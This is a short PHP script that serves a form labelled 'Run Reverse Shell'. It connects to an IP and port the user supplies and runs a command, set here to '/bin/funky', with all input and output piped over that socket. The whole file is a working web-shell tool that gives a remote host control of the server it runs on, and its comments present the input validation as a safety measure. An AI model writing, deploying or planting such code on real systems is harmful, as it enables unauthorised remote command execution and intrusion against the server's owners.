<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip = $_POST['ip'];
    $port = $_POST['port'];

    // Input validation to prevent code injection attacks
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        echo "Invalid IP address.";
        exit;
    }

    if (!filter_var($port, FILTER_VALIDATE_INT, ["options" => ["min_range"=>1, "max_range"=>65535]])) {
        echo "Invalid port number.";
        exit;
    }

    $cmd = '/bin/funky';

    // Escape the command to prevent shell injection
    $escaped_cmd = escapeshellcmd($cmd);

    // Open a socket to the specified IP and port
    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
        echo "Could not connect to $ip on port $port: $errstr ($errno).";
        exit;
    }

    // Set up descriptors for proc_open
    $descriptorspec = array(
        0 => $sock,   // stdin
        1 => $sock,   // stdout
        2 => $sock    // stderr
    );

    // Execute the command and tie it to the socket
    $process = proc_open($escaped_cmd, $descriptorspec, $pipes);

    if (is_resource($process)) {
        // Wait for the process to finish
        proc_close($process);
    } else {
        echo "Unable to execute the command.";
    }
} else {
    // Display the form for IP and port input
    echo '<html><body>
    <form method="POST">
    IP Address: <input type="text" name="ip"><br>
    Port: <input type="text" name="port"><br>
    <input type="submit" value="Run Reverse Shell">
    </form>
    </body></html>';
}
?>
